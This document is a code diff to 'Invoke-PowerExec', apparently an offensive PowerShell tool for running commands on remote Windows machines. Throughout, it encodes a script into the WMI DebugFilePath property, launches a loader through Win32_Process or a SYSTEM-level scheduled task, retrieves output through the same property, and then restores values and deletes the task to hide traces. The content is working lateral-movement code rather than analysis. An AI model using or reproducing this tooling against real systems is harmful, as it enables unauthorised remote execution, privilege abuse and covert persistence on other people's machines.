@@ -1,3 +1,5 @@
+#requires -version 3
+
 function Invoke-PowerExec {
 <#
 .SYNOPSIS
@@ -387,18 +389,15 @@ function Local:New-PowerExec {
             try {
                 $output = Invoke-WmiExec -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
             }
-            catch [Runtime.InteropServices.COMException] {
-                Write-Verbose "[$ComputerName] RPC server is unavailable."
-            }
-            catch [UnauthorizedAccessException] {
-                Write-Verbose "[$ComputerName] Access is denied."
-            }
-            catch [Management.Automation.MethodInvocationException] {
-                Write-Verbose "[$ComputerName] Insufficient rights."
-            }
-            catch [Management.Automation.RuntimeException] {
-                if($Error[0].FullyQualifiedErrorId -eq 'InvokeMethodOnNull') {
-                    Write-Verbose "[$ComputerName] DNS resolution failed."
+            catch [Microsoft.Management.Infrastructure.CimException] {
+                if($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x800706ba,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
+                    Write-Verbose "[$ComputerName] Host is unreachable."
+                }
+                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8007052e,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
+                    Write-Verbose "[$ComputerName] Access is denied."
+                }
+                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
+                    Write-Verbose "[$ComputerName] Access is denied."
                 }
                 else {
                     Write-Warning "[$ComputerName] Execution failed. $_"
@@ -409,18 +408,15 @@ function Local:New-PowerExec {
             try {
                 $output = Invoke-SchTaskExec -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
             }
-            catch [Runtime.InteropServices.COMException] {
-                Write-Verbose "[$ComputerName] RPC server is unavailable."
-            }
-            catch [UnauthorizedAccessException] {
-                Write-Verbose "[$ComputerName] Access is denied."
-            }
-            catch [Management.Automation.MethodInvocationException] {
-                Write-Verbose "[$ComputerName] Insufficient rights."
-            }
-            catch [Management.Automation.RuntimeException] {
-                if($Error[0].FullyQualifiedErrorId -eq 'InvokeMethodOnNull') {
-                    Write-Verbose "[$ComputerName] DNS resolution failed."
+            catch [Microsoft.Management.Infrastructure.CimException] {
+                if($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x800706ba,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
+                    Write-Verbose "[$ComputerName] Host is unreachable."
+                }
+                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8007052e,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
+                    Write-Verbose "[$ComputerName] Access is denied."
+                }
+                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
+                    Write-Verbose "[$ComputerName] Access is denied."
                 }
                 else {
                     Write-Warning "[$ComputerName] Execution failed. $_"
@@ -431,6 +427,84 @@ function Local:New-PowerExec {
     if ($output) {
         Write-Host "[$ComputerName] Successful execution"
         Write-Output $output
+    }
+}
+
+function Local:Invoke-CimDelivery {
+    Param (
+        [Parameter(Mandatory = $True)]
+        [CimSession]
+        $CimSession,
+
+        [ValidateNotNullOrEmpty()]
+        [ScriptBlock]
+        $ScriptBlock
+    )
+
+    BEGIN {
+        Write-Verbose "[CIMDELIVERY] Getting CIM object"
+        $cimObject = Get-CimInstance -Class Win32_OSRecoveryConfiguration -CimSession $CimSession -ErrorAction Stop -Verbose:$false
+        $obj = New-Object -TypeName psobject
+        $obj | Add-Member -MemberType NoteProperty -Name 'OriginalValue' -Value $cimObject.DebugFilePath
+    }
+    PROCESS {
+        Write-Verbose "[CIMDELIVERY] Encoding payload into CIM property DebugFilePath"
+        $script = ''
+        $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
+        $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
+        $script += '$encOutput = [Int[]][Char[]]$output -Join '',''' + [Environment]::NewLine
+        $script += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration' + [Environment]::NewLine
+        $script += '$x.DebugFilePath = $encOutput' + [Environment]::NewLine
+        $script += '$x.Put()'
+        $encScript = [Int[]][Char[]]$script -Join ','
+        $cimObject.DebugFilePath = $encScript
+        $cimObject | Set-CimInstance -Verbose:$false
+        $obj | Add-Member -MemberType NoteProperty -Name 'TamperedValue' -Value $cimObject.DebugFilePath
+    }
+    END {
+        $loader = ''
+        $loader += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration; '
+        $loader += '$y = [char[]][int[]]$x.DebugFilePath.Split('','') -Join ''''; '
+        $loader += '$z = [ScriptBlock]::Create($y); '
+        $loader += '& $z'
+        $obj | Add-Member -MemberType NoteProperty -Name 'Loader' -Value $loader
+        return $obj
+    }
+}
+
+function Local:Invoke-CimRecovery {
+    Param (
+        [Parameter(Mandatory = $True)]
+        [CimSession]
+        $CimSession,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $DefaultValue = '%SystemRoot%\MEMORY.DMP'
+    )
+
+    BEGIN {
+        Write-Verbose "[CIMRECOVERY] Getting CIM object"
+        $cimObject = Get-CimInstance -ClassName Win32_OSRecoveryConfiguration -CimSession $cimSession -Verbose:$false -ErrorAction Stop
+        $computerName = $CimSession.ComputerName
+    }
+    PROCESS {
+        try {
+            Write-Verbose "[CIMRECOVERY] Decoding data from property DebugFilePath"
+            $serializedOutput = [char[]][int[]]$cimObject.DebugFilePath.Split(',') -Join ''
+            $output = ([Management.Automation.PSSerializer]::Deserialize($serializedOutput))
+        }
+        catch [Management.Automation.RuntimeException] {
+            Write-Warning "[$computerName] Failed to decode data."
+        }
+        finally {
+            Write-Verbose "[CIMRECOVERY] Restoring original value: $DefaultValue"
+            $cimObject.DebugFilePath = $DefaultValue
+            $cimObject | Set-CimInstance -Verbose:$false
+        }
+    }
+    END {
+        return $output
     }
 }
 
@@ -448,60 +522,44 @@ function Local:Invoke-WMIExec {
         [ValidateNotNullOrEmpty()]
         [Management.Automation.PSCredential]
         [Management.Automation.Credential()]
-        $Credential = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [ValidateSet('Dcom', 'Wsman')]
+        [String]
+        $Protocol = 'Dcom'
     )
 
     BEGIN {
         try {
-            $originalObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential -ErrorAction Stop
-            $originalProperty = $originalObject.DebugFilePath
-            Write-Verbose "[WMIEXEC] Encoding payload into WMI property DebugFilePath"
-            $script = ''
-            $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
-            $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
-            $script += '$encOutput = [Int[]][Char[]]$output -Join '',''' + [Environment]::NewLine
-            $script += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration' + [Environment]::NewLine
-            $script += '$x.DebugFilePath = $encOutput' + [Environment]::NewLine
-            $script += '$x.Put()'
-            $encScript = [Int[]][Char[]]$script -Join ','
-            $originalObject.DebugFilePath = $encScript
-            $originalObject.Put() | Out-Null
+            $cimOption = New-CimSessionOption -Protocol $Protocol
+            if ($Credential.Username) {
+                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
+            }
+            else {
+                $cimSession = New-CimSession -ComputerName $ComputerName -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
+            }
         }
         catch {
             throw $_
         }
+        $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
+        $command = 'powershell -NoP -NonI -C "' + $delivery.Loader + '"'
     }
     PROCESS {
-        $loader = ''
-        $loader += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration; '
-        $loader += '$y = [char[]][int[]]$x.DebugFilePath.Split('','') -Join ''''; '
-        $loader += '$z = [ScriptBlock]::Create($y); '
-        $loader += '& $z'
-        $command = 'powershell -NoP -NonI -C "' + $loader + '"'
-        Write-Verbose "[WMIEXEC] Running command: $command"    
-        $Process = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $command -ComputerName $ComputerName -Credential $Credential
-        $ProcessId = $Process.ProcessId
-        do {
-            Get-WmiObject -Class Win32_process -Filter "ProcessId='$ProcessId'" -ComputerName $ComputerName -Credential $Credential | Out-Null
-            Start-Sleep -Seconds 1
+        try {
+            Write-Verbose "[WMIEXEC] Running command: $command"    
+            $process = Invoke-CimMethod -ClassName Win32_Process -Name Create -Arguments @{CommandLine=$command} -CimSession $cimSession -Verbose:$false
+            while ((Get-CimInstance -ClassName Win32_Process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession -Verbose:$false).ProcessID) {
+                Start-Sleep -Seconds 1
+            }
         }
-        until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$ProcessId'" -ComputerName $ComputerName -Credential $Credential | Where {$_.Name -eq "powershell.exe"}).ProcessID -eq $null)
+        catch [Microsoft.Management.Infrastructure.CimException] {
+            Write-Warning "[$ComputerName] Execution failed. $_"
+        }
     }
     END {
-        Write-Verbose "[WMIEXEC] Getting output from WMI property DebugFilePath"
-        $modifiedObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
-        $output = [char[]][int[]]$modifiedObject.DebugFilePath.Split(',') -Join ''
-        try {
-            Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
-        }
-        catch [Management.Automation.MethodInvocationException] {
-            Write-Warning "[$ComputerName] Failed to retrieve output."
-        }
-        finally {
-            Write-Verbose "[WMIEXEC] Restoring original WMI property value: $originalProperty"
-            $modifiedObject.DebugFilePath = $originalProperty
-            $modifiedObject.Put() | Out-Null
-        }
+        Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
+        Remove-CimSession -CimSession $cimSession
     }
 }
 
@@ -527,8 +585,8 @@ function Local:Invoke-SchTaskExec {
     )
 
     BEGIN {
-        $cimOption = New-CimSessionOption -Protocol $Protocol
         try {
+            $cimOption = New-CimSessionOption -Protocol $Protocol
             if ($Credential.Username) {
                 $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
             }
@@ -536,71 +594,43 @@ function Local:Invoke-SchTaskExec {
                 $cimSession = New-CimSession -ComputerName $ComputerName -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
             }
         }
-        catch [Microsoft.Management.Infrastructure.CimException] {
-            Write-Verbose "[$ComputerName] Failed to establish CIM session."
-            break
-        }
-
-        try {
-            $originalObject = Get-CimInstance -Class Win32_OSRecoveryConfiguration -CimSession $cimSession -ErrorAction Stop -Verbose:$false
-            $originalProperty = $originalObject.DebugFilePath
-            Write-Verbose "[SCHTASKEXEC] Encoding payload into WMI property DebugFilePath"
-            $script = ''
-            $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
-            $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
-            $script += '$encOutput = [Int[]][Char[]]$output -Join '',''' + [Environment]::NewLine
-            $script += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration' + [Environment]::NewLine
-            $script += '$x.DebugFilePath = $encOutput' + [Environment]::NewLine
-            $script += '$x.Put()'
-            $encScript = [Int[]][Char[]]$script -Join ','
-            $originalObject.DebugFilePath = $encScript
-            $originalObject | Set-CimInstance -Verbose:$false
-        }
         catch {
             throw $_
         }
+        $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
+        $argument = '-NoP -NonI -C "' + $delivery.Loader + '"'
     }
     PROCESS {
-        $loader = ''
-        $loader += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration; '
-        $loader += '$y = [char[]][int[]]$x.DebugFilePath.Split('','') -Join ''''; '
-        $loader += '$z = [ScriptBlock]::Create($y); '
-        $loader += '& $z'
-        $arguments = '-NoP -NonI -C "' + $loader + '"'
-        Write-Verbose "[SCHTASKEXEC] Running command: powershell.exe $arguments"
-        $taskParameters = @{
-            TaskName = [guid]::NewGuid().Guid
-            Action = New-ScheduledTaskAction -WorkingDirectory "%windir%\System32\WindowsPowerShell\v1.0\" -Execute "powershell.exe" -Argument $arguments
-            Principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest -CimSession $cimSession
-        }
-        $scheduledTask = Register-ScheduledTask @taskParameters -CimSession $cimSession -ErrorAction Stop
-        $cimJob = $scheduledTask | Start-ScheduledTask -AsJob -ErrorAction Stop
-        $cimJob | Wait-Job | Remove-Job -Force -Confirm:$False
-        while (($scheduledTaskInfo = $scheduledTask | Get-ScheduledTaskInfo).LastTaskResult -eq 267009) { Start-Sleep -Milliseconds 200 }
+        try  {
+            Write-Verbose "[SCHTASKEXEC] Running command: powershell $argument"
+            $taskParameters = @{
+                TaskName = [guid]::NewGuid().Guid
+                Action = New-ScheduledTaskAction -WorkingDirectory "%windir%\System32\WindowsPowerShell\v1.0\" -Execute "powershell" -Argument $argument
+                Principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest -CimSession $cimSession
+            }
+            $scheduledTask = Register-ScheduledTask @taskParameters -CimSession $cimSession -ErrorAction Stop
+            $cimJob = $scheduledTask | Start-ScheduledTask -AsJob -ErrorAction Stop
+            $cimJob | Wait-Job | Remove-Job -Force -Confirm:$False
+            while (($scheduledTaskInfo = $scheduledTask | Get-ScheduledTaskInfo).LastTaskResult -eq 267009) {
+                Start-Sleep -Seconds 1
+            }
 
-        if ($scheduledTaskInfo.LastRunTime.Year -ne (Get-Date).Year) { 
-            Write-Warning "[$ComputerName] Failed to execute scheduled task."
+            if ($scheduledTaskInfo.LastRunTime.Year -ne (Get-Date).Year) { 
+                Write-Warning "[$ComputerName] Failed to execute scheduled task."
+            }
+
+            Write-Verbose "[SCHTASKEXEC] Unregistering scheduled task $($taskParameters.TaskName)"
+            $scheduledTask | Get-ScheduledTask -ErrorAction SilentlyContinue | Unregister-ScheduledTask | Out-Null
+        }
+        catch [Management.Automation.ActionPreferenceStopException] {
+            Write-Warning "[$ComputerName] Insufficient rights."
+        }
+        catch {
+            Write-Warning "[$ComputerName] Execution failed. $_"
         }
     }
     END {
-        Write-Verbose "[SCHTASKEXEC] Unregistering scheduled task $($taskParameters.TaskName)"
-        $scheduledTask | Get-ScheduledTask -ErrorAction SilentlyContinue | Unregister-ScheduledTask | Out-Null
-
-        Write-Verbose "[SCHTASKEXEC] Getting output from WMI property DebugFilePath"
-        $modifiedObject = Get-CimInstance -ClassName Win32_OSRecoveryConfiguration -CimSession $cimSession -Verbose:$false -ErrorAction Stop
-        $output = [char[]][int[]]$modifiedObject.DebugFilePath.Split(',') -Join ''
-        try {
-            Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
-        }
-        catch [Management.Automation.MethodInvocationException] {
-            Write-Warning "[$ComputerName] Failed to retrieve output."
-        }
-        finally {
-            Write-Verbose "[SCHTASKEXEC] Restoring original WMI property value: $originalProperty"
-            $modifiedObject.DebugFilePath = $originalProperty
-            $modifiedObject | Set-CimInstance -Verbose:$false
-
-            Remove-CimSession -CimSession $cimSession
-        }
+        Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
+        Remove-CimSession -CimSession $cimSession
     }
 }
